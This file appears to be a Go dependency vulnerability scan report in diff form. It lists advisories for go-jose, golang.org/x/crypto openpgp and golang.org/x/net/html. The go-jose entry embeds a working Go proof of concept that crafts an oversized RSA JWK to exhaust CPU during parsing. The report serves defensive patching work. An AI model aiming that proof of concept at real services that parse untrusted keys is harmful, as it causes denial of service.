@@ -1,0 +1,422 @@
+{
+  "results": [
+    {
+      "source": {
+        "path": "./go.mod",
+        "type": "lockfile"
+      },
+      "packages": [
+        {
+          "package": {
+            "name": "github.com/go-jose/go-jose/v4",
+            "version": "4.1.5",
+            "ecosystem": "Go",
+            "purl": "pkg:golang/github.com/go-jose/go-jose/v4@4.1.5"
+          },
+          "groups": [
+            {
+              "ids": [
+                "GHSA-mgcc-cww5-fp2q"
+              ],
+              "aliases": [
+                "CVE-2026-116587",
+                "GHSA-mgcc-cww5-fp2q"
+              ],
+              "max_severity": "7.5"
+            }
+          ],
+          "vulnerabilities": [
+            {
+              "affected": [
+                {
+                  "database_specific": {
+                    "last_known_affected_version_range": "\u003c= 4.1.5",
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/10/GHSA-mgcc-cww5-fp2q/GHSA-mgcc-cww5-fp2q.json"
+                  },
+                  "package": {
+                    "ecosystem": "Go",
+                    "name": "github.com/go-jose/go-jose/v4",
+                    "purl": "pkg:golang/github.com/go-jose/go-jose/v4"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "4.1.6"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                },
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/10/GHSA-mgcc-cww5-fp2q/GHSA-mgcc-cww5-fp2q.json"
+                  },
+                  "package": {
+                    "ecosystem": "Go",
+                    "name": "github.com/go-jose/go-jose/v3",
+                    "purl": "pkg:golang/github.com/go-jose/go-jose/v3"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "last_affected": "3.0.5"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                }
+              ],
+              "aliases": [
+                "CVE-2026-116587"
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-407",
+                  "CWE-770"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2026-10-27T19:01:30Z",
+                "nvd_published_at": "2026-10-26T22:16:55Z",
+                "severity": "HIGH"
+              },
+              "details": "### Summary\n\nA crafted RSA key inside a JWK can cause operations that parse JWKs to consume excess CPU.\n\n### Details\n\ngo-jose does not check for bounds on RSA modulus and primes before validating them. Values are passed directly to `crypto/rsa.PrivateKey.Validate()`. On Go 1.24+, this takes cubic time complexity with respect to the RSA modulus and primes. This allows an attacker to supply a crafted JWK to consume excessive CPU.\n\nhttps://github.com/go-jose/go-jose/blob/5b371aecfcf7aabe06068d67da4344591ecddc76/jwk.go#L655-L700\n\n### Proof of concept\n\nNo special configuration of go-jose is required to reproduce this vulnerability.\n\n```go\npackage main\n\nimport (\n\t\"encoding/base64\"\n\t\"encoding/json\"\n\t\"fmt\"\n\t\"math/big\"\n\t\"time\"\n\n\t\"github.com/go-jose/go-jose/v4\"\n)\n\nfunc main() {\n\t// The RSA parameters can be complete junk. The CPU cost is in validating them.\n\tprimeBits := 16384\n\tp := new(big.Int).Lsh(big.NewInt(1), uint(primeBits-1))\n\tp.SetBit(p, 0, 1)\n\tn := new(big.Int).Lsh(big.NewInt(1), 2048)\n\te := big.NewInt(65537)\n\td := big.NewInt(3)\n\tq := big.NewInt(3)\n\n\tjwk := map[string]string{\n\t\t\"kty\": \"RSA\",\n\t\t\"n\":   base64.RawURLEncoding.EncodeToString(n.Bytes()),\n\t\t\"e\":   base64.RawURLEncoding.EncodeToString(e.Bytes()),\n\t\t\"d\":   base64.RawURLEncoding.EncodeToString(d.Bytes()),\n\t\t\"p\":   base64.RawURLEncoding.EncodeToString(p.Bytes()),\n\t\t\"q\":   base64.RawURLEncoding.EncodeToString(q.Bytes()),\n\t}\n\n\tprotected := map[string]any{\n\t\t\"alg\": \"RS256\",\n\t\t\"jwk\": jwk,\n\t}\n\tprotJSON, _ := json.Marshal(protected)\n\n\tjws := map[string]string{\n\t\t\"protected\": base64.RawURLEncoding.EncodeToString(protJSON),\n\t\t\"payload\":   base64.RawURLEncoding.EncodeToString([]byte(`{}`)),\n\t\t\"signature\": base64.RawURLEncoding.EncodeToString([]byte(\"not-a-real-signature\")),\n\t}\n\tjwsJSON, _ := json.Marshal(jws)\n\n\tstart := time.Now()\n\t_, err := jose.ParseSigned(string(jwsJSON), []jose.SignatureAlgorithm{jose.RS256})\n\telapsed := time.Since(start)\n\n\tfmt.Printf(\"prime bits: %d\\n\", primeBits)\n\tfmt.Printf(\"parse time: %s\\n\", elapsed)\n\tfmt.Printf(\"parse error: %v\\n\", err)\n}\n```\n\n### Impact\n\nDenial of service vulnerability. Any application that uses go-jose to parse JWKs from untrusted sources is affected and should patch immediately.\n\n### Credits\n\nReported by Yuval Saggie and Mor Weinberger (powered by Echo Frontier)",
+              "id": "GHSA-mgcc-cww5-fp2q",
+              "modified": "2026-10-27T19:15:23.147827328Z",
+              "published": "2026-10-27T19:01:30Z",
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/go-jose/go-jose/security/advisories/GHSA-mgcc-cww5-fp2q"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-116587"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/go-jose/go-jose/commit/a0111f82742fa92bceec9ede40845e73319e6230"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/go-jose/go-jose"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/go-jose/go-jose/releases/tag/v4.1.6"
+                }
+              ],
+              "schema_version": "1.9.2",
+              "severity": [
+                {
+                  "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+                  "type": "CVSS_V3"
+                }
+              ],
+              "summary": "Go JOSE: DoS when parsing JWKs that contain RSA keys"
+            }
+          ]
+        },
+        {
+          "package": {
+            "name": "golang.org/x/crypto",
+            "version": "0.58.0",
+            "ecosystem": "Go",
+            "purl": "pkg:golang/golang.org/x/crypto@0.58.0"
+          },
+          "groups": [
+            {
+              "ids": [
+                "GO-2026-5932"
+              ],
+              "aliases": [
+                "GO-2026-5932"
+              ],
+              "experimental_analysis": {
+                "GO-2026-5932": {
+                  "called": false,
+                  "unimportant": false
+                }
+              },
+              "max_severity": ""
+            }
+          ],
+          "vulnerabilities": [
+            {
+              "affected": [
+                {
+                  "database_specific": {
+                    "source": "https://vuln.go.dev/ID/GO-2026-5932.json"
+                  },
+                  "ecosystem_specific": {
+                    "imports": [
+                      {
+                        "path": "golang.org/x/crypto/openpgp"
+                      },
+                      {
+                        "path": "golang.org/x/crypto/openpgp/packet"
+                      },
+                      {
+                        "path": "golang.org/x/crypto/openpgp/armor"
+                      },
+                      {
+                        "path": "golang.org/x/crypto/openpgp/clearsign"
+                      },
+                      {
+                        "path": "golang.org/x/crypto/openpgp/errors"
+                      },
+                      {
+                        "path": "golang.org/x/crypto/openpgp/elgamal"
+                      },
+                      {
+                        "path": "golang.org/x/crypto/openpgp/s2k"
+                      }
+                    ]
+                  },
+                  "package": {
+                    "ecosystem": "Go",
+                    "name": "golang.org/x/crypto",
+                    "purl": "pkg:golang/golang.org/x/crypto"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "0"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                }
+              ],
+              "database_specific": {
+                "review_status": "REVIEWED",
+                "url": "https://pkg.go.dev/vuln/GO-2026-5932"
+              },
+              "details": "The golang.org/x/crypto/openpgp package is unsafe by design, has numerous known security issues, is not maintained, and should not be used.\n\nIf you are required to interoperate with OpenPGP systems and need a maintained package, consider github.com/ProtonMail/go-crypto/openpgp which is a maintained fork that aims to be a drop-in replacement for this package.",
+              "id": "GO-2026-5932",
+              "modified": "2026-07-10T05:44:31.101996029Z",
+              "published": "2026-07-07T22:15:29Z",
+              "references": [
+                {
+                  "type": "REPORT",
+                  "url": "https://go.dev/issue/44226"
+                }
+              ],
+              "related": [
+                "CGA-485h-x96h-hqh7"
+              ],
+              "schema_version": "1.7.5",
+              "summary": "The golang.org/x/crypto/openpgp package is unmaintained, unsafe by design, and has known security issues"
+            }
+          ]
+        },
+        {
+          "package": {
+            "name": "golang.org/x/net",
+            "version": "0.61.0",
+            "ecosystem": "Go",
+            "purl": "pkg:golang/golang.org/x/net@0.61.0"
+          },
+          "groups": [
+            {
+              "ids": [
+                "GO-2026-6860"
+              ],
+              "aliases": [
+                "CVE-2026-78661",
+                "GO-2026-6860"
+              ],
+              "experimental_analysis": {
+                "GO-2026-6860": {
+                  "called": false,
+                  "unimportant": false
+                }
+              },
+              "max_severity": ""
+            },
+            {
+              "ids": [
+                "GO-2026-6866"
+              ],
+              "aliases": [
+                "CVE-2026-97045",
+                "GO-2026-6866"
+              ],
+              "experimental_analysis": {
+                "GO-2026-6866": {
+                  "called": false,
+                  "unimportant": false
+                }
+              },
+              "max_severity": ""
+            }
+          ],
+          "vulnerabilities": [
+            {
+              "affected": [
+                {
+                  "database_specific": {
+                    "source": "https://vuln.go.dev/ID/GO-2026-6860.json"
+                  },
+                  "ecosystem_specific": {
+                    "imports": [
+                      {
+                        "path": "golang.org/x/net/html",
+                        "symbols": [
+                          "Parse",
+                          "ParseFragment",
+                          "ParseFragmentWithOptions",
+                          "ParseWithOptions",
+                          "parser.addText",
+                          "parser.fosterParent",
+                          "parser.parse"
+                        ]
+                      }
+                    ]
+                  },
+                  "package": {
+                    "ecosystem": "Go",
+                    "name": "golang.org/x/net",
+                    "purl": "pkg:golang/golang.org/x/net"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "0.62.0"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                }
+              ],
+              "aliases": [
+                "CVE-2026-78661"
+              ],
+              "credits": [
+                {
+                  "name": "Markus Magnuson"
+                }
+              ],
+              "database_specific": {
+                "review_status": "REVIEWED",
+                "url": "https://pkg.go.dev/vuln/GO-2026-6860"
+              },
+              "details": "When coalescing adjacent text nodes in addText and fosterParent, appending to an existing TextNode's Data via string concatenation (n.Data += text) reallocated and copied the accumulated string on every token. Inputs containing many short text runs separated by ignored end tags (such as \"a\u003c/x\u003e\") caused O(n^2) allocations and byte copies.\n\nAccumulate coalesced text in per-node byte slices during parsing and materialize Data strings once at the end of parse.",
+              "id": "GO-2026-6860",
+              "modified": "2026-10-27T21:30:04.890809062Z",
+              "published": "2026-10-27T21:16:18Z",
+              "references": [
+                {
+                  "type": "FIX",
+                  "url": "https://go.dev/cl/849365"
+                },
+                {
+                  "type": "REPORT",
+                  "url": "https://go.dev/issue/82224"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://groups.google.com/g/golang-announce/c/sqrs2vTx_Xs"
+                }
+              ],
+              "schema_version": "1.9.2",
+              "summary": "Avoid quadratic complexity when coalescing text nodes in html in golang.org/x/net"
+            },
+            {
+              "affected": [
+                {
+                  "database_specific": {
+                    "source": "https://vuln.go.dev/ID/GO-2026-6866.json"
+                  },
+                  "ecosystem_specific": {
+                    "imports": [
+                      {
+                        "path": "golang.org/x/net/html",
+                        "symbols": [
+                          "Render",
+                          "childTextNodesAreLiteral"
+                        ]
+                      }
+                    ]
+                  },
+                  "package": {
+                    "ecosystem": "Go",
+                    "name": "golang.org/x/net",
+                    "purl": "pkg:golang/golang.org/x/net"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "0.62.0"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                }
+              ],
+              "aliases": [
+                "CVE-2026-97045"
+              ],
+              "credits": [
+                {
+                  "name": "Ali Sherif (https://www.linkedin.com/in/ali-sherif-13812b276)"
+                }
+              ],
+              "database_specific": {
+                "review_status": "REVIEWED",
+                "url": "https://pkg.go.dev/vuln/GO-2026-6866"
+              },
+              "details": "In childTextNodesAreLiteral, walking up the tree previously stopped at the nearest foreign ancestor once an HTML integration point was found. However, that integration point may itself be a descendant of an element that was foster-parented into a foreign namespace (such as \u003cmglyph\u003e or \u003cmalignmark\u003e fostered under \u003cmtext\u003e), causing a parser to resolve the subtree in a different foreign namespace upon re-parsing the rendered output.\n\nContinue walking the full ancestor chain and verify that every transition from a non-empty namespace occurs at an HTML integration point before emitting literal text.",
+              "id": "GO-2026-6866",
+              "modified": "2026-10-27T21:45:08.978077289Z",
+              "published": "2026-10-27T21:16:18Z",
+              "references": [
+                {
+                  "type": "FIX",
+                  "url": "https://go.dev/cl/855121"
+                },
+                {
+                  "type": "REPORT",
+                  "url": "https://go.dev/issue/82622"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://groups.google.com/g/golang-announce/c/sqrs2vTx_Xs"
+                }
+              ],
+              "schema_version": "1.9.2",
+              "summary": "Check all ancestor namespace transitions when rendering raw text in html in golang.org/x/net"
+            }
+          ]
+        }
+      ]
+    }
+  ],
+  "experimental_config": {
+    "licenses": {
+      "summary": false,
+      "allowlist": null
+    }
+  }
+}
